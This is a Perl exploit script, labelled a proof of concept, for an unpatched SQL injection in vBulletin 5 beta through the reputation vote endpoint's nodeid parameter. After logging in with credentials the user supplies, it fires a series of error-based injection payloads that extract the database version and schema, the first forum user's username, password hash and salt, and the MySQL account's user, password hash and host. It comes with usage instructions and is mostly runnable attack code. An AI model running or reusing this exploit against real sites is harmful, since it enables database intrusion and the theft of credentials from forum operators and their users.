#!/usr/bin/perl
###################################################################################
#                                                           Satuday, March 30, 2013
#
#
#
#                    _  _  .__                .__               
#                 __| || |_|  |   ____   ____ |__| ____   ____  
#                 \   __   /  | _/ __ \ / ___\|  |/  _ \ /    \ 
#                  |  ||  ||  |_\  ___// /_/  >  (  <_> )   |  \
#                 /_  ~~  _\____/\___  >___  /|__|\____/|___|  /
#                   |_||_|           \/_____/                \/
#                                    http://www.zempirians.com
#
#          00100011 01101100 01100101 01100111 01101001 01101111 01101110
#
#
#      
#                       [P]roof [o]f [C]oncept, SQL Injection
#     vBulletin. is the world leader in forum and community publishing software.
#
#
#
###################################################################################
#                                                           #      T E A M        #
#                                                           #######################
#
# UberLame .......> Provided all proper payloads
# Stealth ........> Thanks ;)
#
###################################################################################
#  SUMMARY     #
################
# 
# http://target/vb5/index.php/ajax/api/reputation/vote?nodeid=[SQLi]
#
# Database error in vBulletin 5.0.0 Beta 28:
# MySQL Error   : Duplicate entry '#5.1.67#1' for key 'group_key'
# Error Number  : 1062
# Request Date  : Saturday, March 30th 2013 @ 01:13:40 AM
# Error Date    : Saturday, March 30th 2013 @ 01:13:41 AM
# Script        : http:\/\/\/vb5\/index.php\/ajax\/api\/reputation\/vote
#
################
#  VULNERABLE  #
################
#
#  vBulletin 5 beta [ALL] - http://vbulletin.com
#
################
#  CONFIRMED   #
################
#
#  vBulletin 5 beta 17
#  vBulletin 5 beta 28
#
################
#  CVE         #
################
#
#  There is no CVE reported.
#
################
#  PATCH       #
################
#
#  There is no PATCH available.
#
###################################################################################
#                          #                     #
#                          #    H O W - T O      #
#                          #                     #
#                          #######################
#
# Provide the Target: Server, Folder, User, Password, Number and the script will
# login and deliver the payload...
#
# [!USE/]$ ./<file>.pl http://www.example.com/ <vb5_folder>/ <username> <password> <num>
#
###################################################################################
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common;
use MIME::Base64;
system $^O eq 'MSWin32' ? 'cls' : 'clear';
print "
###############################################################################
#'########:'########:'##::::'##::::::::'##::::'########:::'#######:::'######::#
#..... ##:: ##.....:: ###::'###::::::::. ##::: ##.... ##:'##.... ##:'##... ##:#
#:::: ##::: ##::::::: ####'####:'#####::. ##:: ##:::: ##: ##:::: ##: ##:::..::#
#::: ##:::: ######::: ## ### ##:.....::::. ##: ########:: ##:::: ##: ##:::::::#
#:: ##::::: ##...:::: ##. #: ##:'#####::: ##:: ##.....::: ##:::: ##: ##:::::::#
#: ##:::::: ##::::::: ##:.:: ##:.....::: ##::: ##:::::::: ##:::: ##: ##::: ##:#
# ########: ########: ##:::: ##:::::::: ##:::: ##::::::::. #######::. ######::#
#........::........::..:::::..:::::::::..:::::..::::::::::.......::::......:::#
###############################################################################

[?] Homepage: http://www.zempirians.com
[?] Binary: 00100011 01101100 01100101 01100111 01101001 01101111 01101110
[?] Effected: vBulletin 5 Beta XX SQLi 0day
[?] Irc Server: irc.zempirians.com +6697

";
if (@ARGV != 5) {
    print "\r\nUsage: perl file.pl www.example.com/ vb5/ username password magicnum\r\n";
    print "\r\n";
    exit;
}
$host        = $ARGV[0];
$path        = $ARGV[1];
$username    = $ARGV[2];
$password    = $ARGV[3];
$magicnum    = $ARGV[4];
$encpath     = encode_base64('http://'.$host.$path);

print "\n";
print "[+] Establishing connection and logging in\n";

my $browser = LWP::UserAgent->new;
my $cookie_jar = HTTP::Cookies->new;

my $response = $browser->post( 'http://'.$host.$path.'auth/login',
    [
        'url' => $encpath,
        'username' => $username,
        'password' => $password,
    ],
    Referer => 'http://'.$host.$path.'auth/login-form?url=http://'.$host.$path.'',
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$browser->cookie_jar( $cookie_jar );

print "[+] Send payload [ 1 of 4 ]\n";
my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
        'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast(version() as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);
$dataA = $response->content;
  if ($dataA =~ /(#((\\.)|[^\\#])*#)/) {
                $fixversion = $1;
                $fixversion =~ s/\#//g;
                 $fixvb = substr($dataA, 58, 23);
   };

my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast(schema() as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);
$dataAB = $response->content;
        if ($dataAB =~ /(#((\\.)|[^\\#])*#)/) {
                $fixvbdb = $1;
                 $fixvbdb =~ s/\#//g;
        };


print '[+] Recv payload [ SQL Version: '. $fixversion .', running '. $fixvb .', database '. $fixvbdb .' ]';
print "\n";

print "[+] Send payload [ 2 of 4 ]\n";
my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast(user() as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);
$dataB = $response->content;
  if ($dataB =~ /(#((\\.)|[^\\#])*#)/) {
    $fixuserhost = $1;
    $fixuserhost =~ s/\#//g;
    print '[+] Recv payload [ Forum is running as '. $fixuserhost .' ]';
  };
print "\n";

print "[+] Send payload [ 3 of 4 ]\n";

my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select username from '. $fixvbdb .'.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataC = $response->content;
        if ($dataC =~ /(#((\\.)|[^\\#])*#)/) {
                $fixvbuser = $1;
                $fixvbuser =~ s/\#//g;
  };


my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select password from '. $fixvbdb .'.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataD = $response->content;
        if ($dataD =~ /(#((\\.)|[^\\#])*#)/) {
                $fixvbpass = $1;
                $fixvbpass =~ s/\#//g;
        };


my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select salt from '. $fixvbdb .'.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataE = $response->content;
        if ($dataE =~ /(#((\\.)|[^\\#])*#)/) {
                $fixvbsalt = $1;
                $fixvbsalt =~ s/\#//g;
        };


print '[+] Recv payload [ VB5 User: '. $fixvbuser . ', Pass: '. $fixvbpass .', Salt: '. $fixvbsalt .' ]';
print "\n";

print "[+] Send payload [ 4 of 4 ]\n";

my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select user from mysql.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataF = $response->content;
        if ($dataF =~ /(#((\\.)|[^\\#])*#)/) {
                $fixsqluser = $1;
                $fixsqluser =~ s/\#//g;
        };

my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select password from mysql.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataG = $response->content;
        if ($dataG =~ /(#((\\.)|[^\\#])*#)/) {
                $fixsqlpass = $1;
                $fixsqlpass =~ s/\#//g;
        };

my $response = $browser->post( 'http://'.$host.$path.'index.php/ajax/api/reputation/vote',
    [
       'nodeid' => $magicnum.') and(select 1 from(select count(*),concat((select (select concat(0x23,cast((select host from mysql.user limit 0,1) as char),0x23)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and (1338=1338',
    ],
    User-Agent => 'Mozilla/11.01 (Lanows MB 9.1; rv:13.37) Gecko/20200101 Firefox/13.37',
);

$dataH = $response->content;
        if ($dataH =~ /(#((\\.)|[^\\#])*#)/) {
                 $fixsqlhost = $1;
                $fixsqlhost =~ s/\#//g;
        };


print '[+] Recv payload [ SQL User: '. $fixsqluser . ', Pass: '. $fixsqlpass .', Host: ' . $fixsqlhost .' ]';

#print "\n\n[?] Error dump - payload 1\n\n";
#print $dataAB;

print "\n\n";

exit 1;
